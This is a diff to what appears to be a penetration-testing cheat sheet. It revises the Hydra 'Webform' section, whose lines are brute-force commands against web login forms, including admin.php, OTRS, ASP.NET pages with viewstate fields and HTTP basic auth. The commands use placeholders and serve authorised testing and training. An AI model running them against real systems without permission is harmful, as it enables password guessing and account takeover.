@@ -433,11 +433,12 @@ $ hydra <RHOST> -L usernames.txt  -P passwords.txt -s 5000 https-get /v2/
 ### Webform
 
 ```console
-$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
-$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
-$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
-$ hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
-$ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-get://<RHOST>
+$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
+$ hydra <RHOST> -L /PATH/TO/WORDLIST/<WORDLIST> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
+$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
+$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
 ```
 
 ## John the Ripper
